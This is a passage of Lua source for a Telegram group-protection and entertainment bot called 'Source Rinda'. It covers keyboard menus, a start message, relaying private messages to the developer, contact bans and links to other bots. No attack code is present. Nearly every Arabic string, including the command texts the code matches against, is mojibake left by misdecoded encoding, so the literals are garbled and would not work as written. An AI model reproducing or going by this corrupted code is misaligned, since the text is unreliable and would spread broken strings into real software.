local key = {{'โข  ุชูุนูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู โ','โข  ุชุนุทูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู โ'},{'โข ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู โ',' โข ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู โ'},{'โข ุชุบูุฑ ูููุดู ุงูุงุดุชุฑุงู โ','โข ุญุฐู ูููุดู ุงูุงุดุชุฑุงู โ'},{'โข ูููุดู ุงูุงุดุชุฑุงู โ','โข ููุงุฉ ุงูุงุดุชุฑุงู โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุงูุงูุฑ ุงูุฎุฏููู โ' or text == '/play' or text == 'โข  ุฑุฌูุน  โ' or text == 'ุงูุงูุฑ ุงูุฎุฏููู' or text == '/free' then
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุงูุงูุงูุฑ ุงูุฎุฏููู ุงูุฎุงุตู ุจุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุงูุงูุฑ ุงูุชุณููู โ','โข ุงูุงูุงูุฑ ุงูุฎุฏููู  โ'},{'โข ุงูุงูุฑ ุงููุณุจ โ','โข ุงูุจูุชุงุช โ'},{'โข ุงูุนุงุจ โ'},{'โข  ุงูุณูุฑุณ โ','โข  ุงููุทูุฑ โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == 'โข ุงูุงูุฑ ุงูุชุณููู โ' then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุฃูุงูุฑ ุงูุชุณููู ุงูุฎุงุตู ุจุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุบูููู โ','โข ุงุบููู โ'},{'โข ูููุฒ โ','โข ุฑูููุณ โ'},{'โข ุตูุฑู โ','โข ูุชุญุฑูู โ'},{'โข ูุณูุณู โ','โข ููู โ'},{'โข  ุฑุฌูุน  โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == 'โข ุงูุงูุงูุฑ ุงูุฎุฏููู  โ' then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุงูุงูุงูุฑ ุงูุฎุฏููู ุงูุฎุงุตู ุจุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุงูุงุจุฑุงุฌ โ','โข ุญุณุงุจ ุงูุนูุฑ โ'},{'โข ุงูุฒุฎุฑูู โ','โข ูุนุงูู ุงูุงุณูุงุก โ'},{'โข ุงูุญูุงูู โ'},{'โข  ูุนุฑูู โ','โข  ุงุณูู โ','โข ุงูุฏูู โ'},{'โข  ูุจุฐุชู โ','โข ูุจุฐุง โ'},{'โข  ุฑุฌูุน  โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == 'โข ุงูุจูุชุงุช โ' then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุฃูุงูุฑ ุงูุจูุชุงุช ุงูุฎุงุตู ุจุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุจูุช ุงูุญุฐู โ','โข ุจูุช ุงูููุณู โ'},{'โข ุจูุช ุงูููุชููุจ โ','โข ุจูุช ุงููุช โ'},{'โข ุจูุช ุงูุฒุฎุฑูู โ'},{'โข  ุฑุฌูุน  โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == 'โข ุงูุงูุฑ ุงููุณุจ โ' then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุฃูุงูุฑ ุงููุณุจ ุงูุฎุงุตู ุจุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ูุณุจู ุงููุฑู โ','โข ูุณุจู ุงูุญุจ โ'},{'โข ูุณุจู ุงูุฑุฌููู โ','โข ูุณุจู ุงูุงููุซู โ'},{'โข ูุณุจู ุงูุบุจุงุก โ','โข ูุณุจู ุงูุฌูุงู โ'},{'โข ูุณุจู ุงูุฎูุงูู โ'},{'โข  ุฑุฌูุน  โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == 'โข ุงูุนุงุจ โ' then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุฃูุนุงุจ ุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงููุนุจู ุงูุฐู ุชุฑูุฏ ูุนุจูุง'
local key = {{'โข ุงูุงูุนุงุจ โ','โข ุงูุงูุนุงุจ ุงููุชุทูุฑู โ'},{'โข ูุช โ'},{'โข ุณูุงููุงุช โ','โข ูุนุงูู โ'},{'โข ุชุฑุชูุจ โ','โข ุญุฒูุฑู โ'},{'โข ุงูุนูุณ โ','โข ุงููุฎุชูู โ'},{'โข ุงูุซูู โ','โข ุงุณุฆูู โ'},{'โข ุชุฎููู โ',''},{'โข ุฑูุงุถูุงุช โ','โข ุงููููุฒู โ'},{'โข  ุฑุฌูุน  โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == '/start' and ChCheck(msg) then  
if not DevRio:get(Rinda..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="โข โ ุงููุทูุฑ . โข",url="t.me/"..(dp.username_ or "Source_Rinda")}},{{text="โข โ ุงูุณูุฑุณ . โข",url="https://t.me/Source_Rinda"},{text="โข โ ูุชูุตูุจ ุจูุช . โข",url="https://t.me/WYYYYY"}},{{text="โข โ ุงุถููู ูู ูุฌููุนุชู . โข",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
local start = DevRio:get(Rinda.."Rio:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "โ๏ธฐูุฑุญุจุง ุงูุง ุจูุช ุงุณูู "..NameBot.."\nโ๏ธฐุงุฎุชุตุงุตู ุญูุงูุฉ ุงููุฌููุนุงุช\nโ๏ธฐูู ุงูุชูููุด ูุงูุณุจุงู ูุงูุฎุฎ .. . ุ\nโ๏ธฐุชูุนููู ุณูู ููุฌุงูุง ููุท ูู ุจุฑูุนู ุงุฏูู ูู ูุฌููุนุชู ูุงุฑุณู ุงูุฑ โข ุชูุนูู\nโ๏ธฐุณูุชู ุฑูุน ุงูุงุฏูููู ูุงูููุดุฆ ุชููุงุฆูุง\nโ๏ธฐุงุฑุณู ุงูุฑ /free ุงู /play ููุชูุชุน ุจุงูุงูุฑ ุงูุงุนุถุงุก"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevRio:setex(Rinda..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if not SecondSudo(msg) and not DevRio:sismember(Rinda..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(Rinda..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, 'โ๏ธฐุชู ุงุฑุณุงู ุฑุณุงูุชู ุงูู [ุงููุทูุฑ](t.me/'..(chat.username_ or "Source_Rinda")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'โ๏ธฐุชู ุงุฑุณุงู ุงูููุตู ูู โข โค\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'ุญุธุฑ' or text == 'ุญุถุฑ' then
local Text = 'โ๏ธฐุงูุนุถู โข ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nโ๏ธฐุชู ุญุธุฑู ูู ุงูุชูุงุตู'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:sadd(Rinda..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'ุงูุบุงุก ุงูุญุธุฑ' or text == 'ุงูุบุงุก ุญุธุฑ' then
local Text = 'โ๏ธฐุงูุนุถู โข ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nโ๏ธฐุชู ุงูุบุงุก ุญุธุฑู ูู ุงูุชูุงุตู'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(Rinda..'Rio:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู ูุงู ุจุญุธุฑ ุงูุจูุช ูุง ุชุณุชุทูุน ุงุฑุณุงู ุงูุฑุณุงุฆู ูู', 1, 'md')
return false  
end 
if text then
Dev_Rio(id_user, 0, 1, text, 1, "md")  
Text = 'โ๏ธฐุชู ุงุฑุณุงู ุงูุฑุณุงูู ุงูู โข โค'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = 'โ๏ธฐุชู ุงุฑุณุงู ุงูููุตู ุงูู โข โค'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = 'โ๏ธฐุชู ุงุฑุณุงู ุงูุตูุฑู ุงูู โข โค'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = 'โ๏ธฐุชู ุงุฑุณุงู ุงููุชุญุฑูู ุงูู โข โค'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = 'โ๏ธฐุชู ุงุฑุณุงู ุงูุจุตูู ุงูู โข โค'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and DevRio:get(Rinda..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุณุชุงุฑุช', 1, 'md')
DevRio:del(Rinda..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(Rinda.."Rio:Start:Bot",text)  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ูููุดุฉ ุงูุณุชุงุฑุช', 1, 'md')
DevRio:del(Rinda..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'ุชุนููู ุฑุฏ ุงูุฎุงุต' and ChCheck(msg) or text == 'ุถุน ูููุดู ุณุชุงุฑุช' and ChCheck(msg) or text == 'โข ุชุนููู ุฑุฏ ุงูุฎุงุต โ' and ChCheck(msg) then 
DevRio:set(Rinda..'Rio:Start:Bots'..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ูู ูููุดุฉ ุงูุณุชุงุฑุช ุงูุงู', 1, 'md')
return false
end
if text == 'ุญุฐู ุฑุฏ ุงูุฎุงุต' and ChCheck(msg) or text == 'ุญุฐู ูููุดู ุณุชุงุฑุช' and ChCheck(msg) or text == 'โข ุญุฐู ุฑุฏ ุงูุฎุงุต โ' and ChCheck(msg) then 
DevRio:del(Rinda..'Start:Bot') 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญุฐู ูููุดุฉ ุงูุณุชุงุฑุช ุถูุนู', 1, 'md')
end
if text == 'ุฌูุจ ุฑุฏ ุงูุฎุงุต' and ChCheck(msg) or text == 'โข ุฌูุจ ุฑุฏ ุงูุฎุงุต โ' and ChCheck(msg) then  
local start = DevRio:get(Rinda.."Rio:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "โ๏ธฐูุฑุญุจุง ุงูุง ุจูุช ุงุณูู "..NameBot.."\nโ๏ธฐุงุฎุชุตุงุตู ุญูุงูุฉ ุงููุฌููุนุงุช\nโ๏ธฐูู ุงูุชูููุด ูุงูุณุจุงู ูุงูุฎุฎ .. . ุ\nโ๏ธฐุชูุนููู ุณูู ููุฌุงูุง ููุท ูู ุจุฑูุนู ุงุฏูู ูู ูุฌููุนุชู ูุงุฑุณู ุงูุฑ โข ุชูุนูู\nโ๏ธฐุณูุชู ุฑูุน ุงูุงุฏูููู ูุงูููุดุฆ ุชููุงุฆูุง"
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'ุชูุนูู ุงูุชูุงุตู' and ChCheck(msg) or text == 'โข ุชูุนูู ุงูุชูุงุตู โ' and ChCheck(msg) then   
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุชูุงุตู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Texting:Pv') 
end
if text == 'ุชุนุทูู ุงูุชูุงุตู' and ChCheck(msg) or text == 'โข ุชุนุทูู ุงูุชูุงุตู โ' and ChCheck(msg) then  
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุชูุงุตู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Texting:Pv',true) 
end
if Sudo(msg) then
if text == 'ุชูุนูู ุงููุณุฎู ุงูุชููุงุฆูู' or text == 'ุชูุนูู ุฌูุจ ูุณุฎู ุงููุฑูุจุงุช' or text == 'ุชูุนูู ุนูู ูุณุฎู ูููุฌููุนุงุช' or text == 'โข ุชูุนูู ุงููุณุฎู ุงูุชููุงุฆูู โ' then   
Dev_Rio(msg.chat_id_,msg.id_, 1, "โ๏ธฐุชูุนู ุฌูุจ ูุณุฎุฉ ุงููุฑูุจุงุช ุงูุชููุงุฆูู\nโ๏ธฐุณูุชู ุงุฑุณุงู ูุณุฎู ุชููุงุฆูู ูููุฑูุจุงุช ูู ููู ุงูู ุฎุงุต ุงููุทูุฑ ุงูุงุณุงุณู", 1, 'md')
DevRio:del(Rinda.."Rio:Lock:AutoFile")
end
if text == 'ุชุนุทูู ุงููุณุฎู ุงูุชููุงุฆูู' or text == 'ุชุนุทูู ุฌูุจ ูุณุฎู ุงููุฑูุจุงุช' or text == 'ุชุนุทูู ุนูู ูุณุฎู ูููุฌููุนุงุช' or text == 'โข ุชุนุทูู ุงููุณุฎู ุงูุชููุงุฆูู โ' then  
Dev_Rio(msg.chat_id_,msg.id_, 1, "โ๏ธฐุชุนุทู ุฌูุจ ูุณุฎุฉ ุงููุฑูุจุงุช ุงูุชููุงุฆูู", 1, 'md')
DevRio:set(Rinda.."Rio:Lock:AutoFile",true) 
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงูุงุจุฑุงุฌ" or text == "โข ุงูุงุจุฑุงุฌ โ" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ ูู ุฎูุงู ุงูุจูุช ููููู ูุนุฑูู ุชููุนุงุช ุจุฑุฌู \nโ๏ธฐ ููุท ูู ุจุงุฑุณุงู ุงูุฑ ุจุฑุฌ + ุงุณู ุงูุจุฑุฌ \nโ๏ธฐ ูุซุงู : ุจุฑุฌ ุงูุงุณุฏ ุ\nโ๏ธฐ ููุนุฑูู ุจุฑุฌู ูู ุจุงูุฑุฌูุน ุงูู ูุณู ุญุณุงุจ ุงูุนูุฑ ', 1, 'md') end
if text == "ุญุณุงุจ ุงูุนูุฑ" or text == "โข ุญุณุงุจ ุงูุนูุฑ โ" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ ูู ุฎูุงู ุงูุจูุช ููููู ุญุณุงุจ ุนูุฑู \nโ๏ธฐ ููุท ูู ุจุงุฑุณุงู ุงูุฑ ุงุญุณุจ + ููุงููุฏู ุงูู ุงูุจูุช \nโ๏ธฐ ุจุงูุชูุณูู ุงูุชุงูู ูุซุงู : ุงุญุณุจ 2000/7/24', 1, 'md') end
if text == "ุงูุญูุงูู" or text == "โข ุงูุญูุงูู โ" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ ุงุถู ุงูุจูุช ูู ุงููุฌููุนู ุซู ูู ุจุฑูุนู ูุดุฑู ูุงุฑุณู ุชูุนูู \nโ๏ธฐ ูุชูุชุน ุจุฎุฏูุงุช ุบูุฑ ููุฌูุฏู ูู ุจุงูู ุงูุจูุชุงุช ', 1, 'md') end
if text == "ุงูุฒุฎุฑูู" or text == "โข ุงูุฒุฎุฑูู โ" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุฃุฑุณุงู ุฃูุฑ ุฒุฎุฑูู ูุซู ุงุฑุณุงู ุงูุงุณู ุงูุฐู ุชุฑูุฏ ุฒุฎุฑูุชู ุจุฃูุงููููุฒู ุฃู ุงูุนุฑุจู', 1, 'md') end
if text == "ูุนุงูู ุงูุงุณูุงุก" or text == "โข ูุนุงูู ุงูุงุณูุงุก โ" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ ูู ุฎูุงู ุงูุจูุช ููููู ูุนุฑูู ูุนูู ุงุณูู \nโ๏ธฐ ููุท ูู ุจุงุฑุณุงู ุงูุฑ ูุนูู ุงุณู + ุงูุงุณู \nโ๏ธฐ ูุซุงู : ูุนูู ุงุณู ุฑูู', 1, 'md') end
if text == "ุนุฏุฏ ุงููุณุญ" or text == "ุชุนูู ุนุฏุฏ ุงููุณุญ" or text == "ุชุนููู ุนุฏุฏ ุงููุณุญ" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ ููุท ูู ุจุงุฑุณุงู ุงูุฑ ุนุฏุฏ ุงููุณุญ + ุนุฏุฏ ุงููุณุญ \nโ๏ธฐ ูุซุงู : ุนุฏุฏ ุงููุณุญ 100', 1, 'md') end
if text == "ุงูุทู" then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ ููุท ูู ุจุงุฑุณุงู ุงูุฑ ุงูุทู + ุงููููู\nโ๏ธฐุณูููู ุงูุจูุช ุจูุทู ุงููููู \nโ๏ธฐ ูุซุงู : ุงูุทู ููู', 1, 'md') end
if text == "ููุชููุจ" and ChCheck(msg) or text == "ุงูููุชููุจ" and ChCheck(msg) or text == "โข ุจูุช ุงูููุชููุจ โ" and ChCheck(msg) or text == "ุจูุช ุงูููุชููุจ" and ChCheck(msg) or text == "ุงุฑูุฏ ุจูุช ููุชููุจ" and ChCheck(msg) or text == "ุดูุฑูู ุจูุช ููุชููุจ" and ChCheck(msg) or text == "ููุช" and ChCheck(msg) then local inline = {{{text="โข ุงุถุบุท ููุง โข",url="https://t.me/t_stbot"}}} SendInline(msg.chat_id_,'*โ๏ธฐุงุถุบุท ููุญุตูู ุนูู ุจูุช ุงูููุชููุจ*',nil,inline) return false end
if text == "ุงููุณ" and ChCheck(msg) or text == "โข ุจูุช ุงูููุณู โ" and ChCheck(msg) or text == "ุจูุช ุงูููุณู" and ChCheck(msg) or text == "ููุณู" and ChCheck(msg) or text == "ุงุฑูุฏ ุจูุช ุงูููุณู" and ChCheck(msg) or text == "ุฏุฒูู ุจูุช ุงูููุณู" and ChCheck(msg) or text == "ุฏุฒููู ุจูุช ุงูููุณู" and ChCheck(msg) then  Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ@HMSEBOT\nโ๏ธฐ@nnbbot\nโ๏ธฐ@ocBot\nโ๏ธฐ@hebot ', 1, 'md') end
if text == "ุฑุงุจุท ุญุฐู" and ChCheck(msg) or text == "ุฑุงุจุท ุงูุญุฐู" and ChCheck(msg) or text == "ุงุฑูุฏ ุฑุงุจุท ุงูุญุฐู" and ChCheck(msg) or text == "ุดูุฑูู ุฑุงุจุท ุงูุญุฐู" and ChCheck(msg) or text == "ุงุฑูุฏ ุฑุงุจุท ุญุฐู" and ChCheck(msg) then local inline = {{{text="โข ุงุถุบุท ููุง โข",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*โ๏ธฐุงุถุบุท ููุญุตูู ุนูู ุฑุงุจุท ุงูุญุฐู*',nil,inline) return false end
if text == "โข ุจูุช ุงูุญุฐู โ" and ChCheck(msg) or text == "ุจูุช ุงูุญุฐู" and ChCheck(msg) or text == "ุงุฑูุฏ ุจูุช ุงูุญุฐู" and ChCheck(msg) or text == "ุงุฑูุฏ ุจูุช ุญุฐู" and ChCheck(msg) or text == "ุจูุช ุญุฐู" and ChCheck(msg) or text == "ุจูุช ุญุฐู ุญุณุงุจุงุช" and ChCheck(msg) or text == "ุฑุงุญ ุงุญุฐู" and ChCheck(msg) then local inline = {{{text="โข ุงุถุบุท ููุง โข",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*โ๏ธฐุงุถุบุท ููุญุตูู ุนูู ุจูุช ุงูุญุฐู*',nil,inline) return false end
if text == "โข ุจูุช ุงููุช โ" and ChCheck(msg) or text == "ุจูุช ุงููุช" and ChCheck(msg) or text == "ุจูุช ูุช" and ChCheck(msg) then local inline = {{{text="โข ุงุถุบุท ููุง โข",url="https://t.me/E9OBot"}}} SendInline(msg.chat_id_,'*โ๏ธฐุงุถุบุท ููุญุตูู ุนูู ุจูุช ุงููุช*',nil,inline) return false end
if text == "โข ุจูุช ุงูุฒุฎุฑูู โ" and ChCheck(msg) or text == "ุจูุช ุงูุฒุฎุฑูู" and ChCheck(msg) or text == "ุจูุช ุฒุฎุฑูู" and ChCheck(msg) then local inline = {{{text="โข ุงุถุบุท ููุง โข",url="https://t.me/W5555Bot"}}} SendInline(msg.chat_id_,'*โ๏ธฐุงุถุบุท ููุญุตูู ุนูู ุจูุช ุงูุฒุฎุฑูู*',nil,inline) return false end
if text == "ุงูุฏูู" and ChCheck(msg) or text == "โข ุงูุฏูู โ" and ChCheck(msg) then Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงูุฏูู โข โจ `'..msg.sender_user_id_..'` โฉ', 1, 'md') end
-- ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ --
if text == 'ูุจุฐุง' and ChCheck(msg) or text == 'โข ูุจุฐุง โ' then
local RindaTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','ูซ ๐ก๐พ ๐๐๐๐๐๐พ ๐บ๐๐ฝ ๐ฝ๐๐ฟ๐ฟ๐พ๐๐พ๐๐','. ๐ฌ๐บ๐๐พ ๐ฝ๐๐พ๐บ๐๐ ๐ฟ๐๐๐ ๐๐๐๐ ๐๐พ๐ฟ๐๐บ๐ผ๐๐๐๐๐ . .',':Life is lying .','๐จ ๐๐๐๐ ๐บ๐๐๐บ๐๐ ๐๐๐๐พ ๐๐๐ ๐๐พ๐๐พ๐ ๐ฟ๐๐๐๐พ๐'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..RindaTeam[math.random(#RindaTeam)]..'' , 1, 'md')  
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == 'ุงููุทูุฑ' or text == 'ูุทูุฑ' or text == 'โข  ุงููุทูุฑ โ') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,result)
local msg_id = msg.id_/2097152/0.5
Text = "*โ๏ธฐDev Name โฌ * ["..result.first_name_.."](T.me/"..result.username_..")\n*โ๏ธฐDev User โฌ* [@"..result.username_.."]\n*โ๏ธฐDev id โฌ* ["..result.id_.."](T.me/"..result.username_..")"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or Source_Rinda}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุนุฑูู" or text == "โข  ูุนุฑูู โ" then
function get_username(extra,result,success)
text = 'โ๏ธฐูุนุฑูู โข โจ User โฉ'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "ุงุณูู" or text == "โข  ุงุณูู โ" then
function get_firstname(extra,result,success)
text = 'โ๏ธฐุงุณูู โข firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end 
if text == 'ูุจุฐุชู' or text == 'ุจุงูู' or text == 'โข  ูุจุฐุชู โ' then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "ุตูุฑุชู" or text == "โข ุตูุฑุชู โ" then
local my_ph = DevRio:get(Rinda.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," โ๏ธฐุงูุตูุฑู ูุนุทูู") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," โ๏ธฐุนุฏุฏ ุตูุฑู โข "..result.total_count_.." ุตูุฑูโโ", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'ูุง ุชูุชูู ุตูุฑู ูู ุญุณุงุจู', 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงูุงูุนุงุจ ุงููุชุทูุฑู" or text == "ุงูุงูุนุงุจ ุงูุงุญุชุฑุงููู" or text == "โข ุงูุงูุนุงุจ ุงููุชุทูุฑู โ" then
if not DevRio:get(Rinda..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*โ๏ธฐูุงุฆูู ุงูุงูุนุงุจ ุงููุชุทูุฑู ุงุถุบุท ููุนุจ*
]]
keyboard = {} 
